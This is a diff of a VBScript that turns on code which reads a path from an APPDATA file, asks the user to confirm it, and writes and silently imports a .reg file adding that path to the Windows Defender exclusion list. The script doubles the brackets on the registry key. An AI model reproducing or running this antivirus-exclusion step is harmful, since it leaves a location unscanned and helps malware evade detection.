@@ -9,21 +9,26 @@ End If
 Set fs = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
 
-'Set reg_file = fs.CreateTextFile("regModify.reg")
+Set reg_file = fs.CreateTextFile("regModify.reg")
+
+Set withPath_file = fs.OpenTextFile(shell.ExpandEnvironmentStrings("%APPDATA%") + "\S4RA\out\execPath.dat")
 
 key_path = "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths]"
-key_name = shell.CurrentDirectory 'must be escaped inside the .reg file, so they enter as single slash in the registry
-key_value = "RUNASADMIN"
+key_name =  withPath_file.ReadLine 
+key_value = "0"
 
-'reg_file.WriteLine "Windows Registry Editor Version 5.00"
-'reg_file.WriteLine key_path 'put your path here
+withPath_file.Close
+
+key_name = InputBox( "is path correct:", "confirm?", key_name )
+
+reg_file.WriteLine "Windows Registry Editor Version 5.00"
+reg_file.WriteLine "[" + key_path + "]" 'put your path here
 
 
-'reg_file.WriteLine """" & key_name & """=""" & key_value & """" 'escaping quotes inside vbscript string literal
-'reg_file.Close
+reg_file.WriteLine """" & key_name & """=""" & key_value & """" 'escaping quotes inside vbscript string literal
+reg_file.Close
 
 'run it automatically to insert data (may ask for elevated privileges):
-'path = Replace(WScript.ScriptFullName, WScript.ScriptName, "")
-'shell.run "regedit.exe /s """ & path & "regModify.reg"""
+path = Replace(WScript.ScriptFullName, WScript.ScriptName, "")
+shell.run "regedit.exe /s """ & path & "regModify.reg"""
 
-data = InputBox( key_path, key_name, key_value )
